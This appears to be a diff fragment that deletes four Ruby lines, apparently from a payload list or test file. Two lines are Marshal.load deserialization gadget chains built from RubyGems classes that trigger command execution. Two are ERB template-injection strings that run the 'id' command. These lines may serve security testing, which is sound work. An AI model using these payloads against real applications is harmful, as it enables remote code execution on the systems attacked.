@@ -1,4 +1,0 @@
-Marshal.load("\x04\x08o:\x40Gem::Installer\x01:\x0a@teleI\"\x02system('id')\x06:\x06ET")
-Marshal.load("\x04\bo:\x1aGem::SpecFetcher\x01:\n@specso:\x1eGem::Requirement\x01:\t@reqo:\x1fGem::DependencyList\x01:\n@specsa:\x06o:\x1fGem::Source::SpecificFile\x01:\n@speco:\x1bGem::StubSpecification\x02:\x11@loaded_from\"\x0f| id 1>&2\x00:\n@nameI\"\x06x\x06:\x06ET")
-erb = ERB.new("<%= system('id') %>"); erb.result
-ERB.new("<%= `id` %>").result
